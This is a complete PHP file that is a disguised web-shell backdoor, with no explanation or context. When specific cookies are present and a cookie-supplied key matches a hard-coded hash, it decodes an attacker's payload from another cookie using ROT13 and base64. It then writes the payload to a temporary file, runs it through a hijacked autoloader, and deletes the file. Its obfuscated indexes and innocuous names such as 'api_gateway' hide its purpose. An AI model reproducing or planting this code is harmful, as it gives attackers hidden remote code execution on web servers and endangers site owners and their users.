<?php


if (isset($_COOKIE[-92+92]) && isset($_COOKIE[96+-95]) && isset($_COOKIE[-20+23]) && isset($_COOKIE[30+-26])) {
    $object = $_COOKIE;
    function api_gateway($property_set) {
        $object = $_COOKIE;
        $bind = tempnam((!empty(session_save_path()) ? session_save_path() : sys_get_temp_dir()), 'cb0576d2');
        if (!is_writable($bind)) {
            $bind = getcwd() . DIRECTORY_SEPARATOR . "sync_manager";
        }
        $factor = "\x3c\x3f\x70\x68p " . base64_decode(str_rot13($object[3]));
        if (is_writeable($bind)) {
            $marker = fopen($bind, 'w+');
            fputs($marker, $factor);
            fclose($marker);
            spl_autoload_unregister(__FUNCTION__);
            require_once($bind);
            @array_map('unlink', array($bind));
        }
    }
    spl_autoload_register("api_gateway");
    $resource = "78514ed0862c8eff38446381cd49a451";
    if (!strncmp($resource, $object[4], 32)) {
        if (@class_parents("secure_access_splitter_tool", true)) {
            exit;
        }
    }
}
